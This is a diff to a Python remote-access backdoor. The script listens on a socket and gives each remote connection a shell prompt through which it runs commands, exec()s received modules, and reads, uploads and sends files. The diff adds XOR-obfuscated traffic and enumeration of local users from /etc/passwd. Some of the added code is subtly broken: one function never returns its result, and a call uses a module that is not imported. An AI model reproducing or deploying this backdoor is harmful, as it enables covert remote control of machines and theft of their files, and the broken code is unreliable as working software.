@@ -2,12 +2,14 @@
 import os, sys, re
 import socket
 import time
+import shutil
 from base64 import *
 from subprocess import Popen,PIPE,STDOUT,call
 
 socksize = 4096                            
 activePID = []
 home = os.environ['HOME']
+username = os.environ['USERNAME']
 if os.geteuid() != 0:
     currentuser = "nonroot"
 else:
@@ -23,20 +25,43 @@ def xor(string, key):
     return data
 
 
+def users():
+    userlist = []
+    if os.access('/etc/passwd', os.R_OK):
+        passwd = open('/etc/passwd')
+        for line in passwd:
+            fields = line.split(':')
+            uid = int(fields[2])
+            if uid > 500 and uid < 32328:
+                userlist.append(fields[0])
+
+
+def whereis(program):
+    for path in os.environ.get('PATH', '').split(':'):
+        if os.path.exists(os.path.join(path, program)) and \
+            not os.path.isdir(os.path.join(path, program)):
+                return os.path.join(path, program)
+    return None
+
+
 def module_handler(module, modname):
     status_msg("[~] Module: %s\n" % modname)
     exec(module)
-    connection.send("shell => ")
+    connection.send(xor("[%s] shell => " % username, pin))
 
 
 def status_msg(message):
-    connection.send("%s" % message)
+    connection.send(xor("[~] %s" % message, pin))
+    
+
+def error_msg(message):
+    connection.send(xor("[!] %s" % message, pin))
 
 
 def cat_file(filename):
     if os.path.exists(filename) and os.access(filename, os.R_OK):
         catfile = open(filename, "rb")
-        connection.send("[*] Contents of %s" % filename)
+        connection.send(xor("[*] Contents of %s" % filename, pin))
         for lines in catfile.readlines():
             connection.sendall(lines)
         catfile.close()
@@ -65,10 +90,18 @@ def cmd_exec(command):
     connection.sendall( stdout )
 
 
-def cmd2txt(command, textfile):
-    os.system("%s > %s" % (command, textfile))
-    save_file(textfile)
-    os.system("rm %s" % textfile)
+def cmd_save(command, textfile):
+    try:
+        output = subprocess.check_output(command, shell=True)
+        output = output.split("\n")
+        new = file(textfile, "wb")
+        for lines in output:
+            new.write(lines+"\n")
+        new.close()
+        save_file(textfile)
+        os.system("rm %s" % textfile)
+    except:
+        status_msg("error piping command output to file!")
 
 
 def reaper():                              
@@ -96,10 +129,10 @@ def handler(connection):
                     os.chdir(destination)
                     current = os.getcwd()
                     connection.send("[*] current directory: %s" % current)
-                    connection.send("shell => ")
+                    connection.send("[%s] shell => " % username)
                 else:
                     connection.send("[!] Directory does not exist") 
-                    connection.send("shell => ")
+                    connection.send("[%s] shell => " % username)
             except IndexError:
                 pass
         if cmd.startswith(":upload"):
@@ -145,12 +178,12 @@ def handler(connection):
             except IndexError:
                 pass
         elif cmd == (":quit"):
-            conn.close()
+            connection.close()
             os._exit(0)
             sys.exit(0)
         elif proc:
             connection.send(xor( stdout , pin))
-            connection.send(xor("shell => ", pin))
+            connection.send(xor("[%s] shell => " % username, pin))
 
     connection.close() 
     os._exit(0)
@@ -160,7 +193,7 @@ def accept():
     while 1:   
         global connection                                  
         connection, address = conn.accept()
-        connection.send(xor("shell => ", pin))
+        connection.send(xor("[%s] shell => " % username, pin))
         reaper()
         childPid = os.fork()
         if childPid == 0:
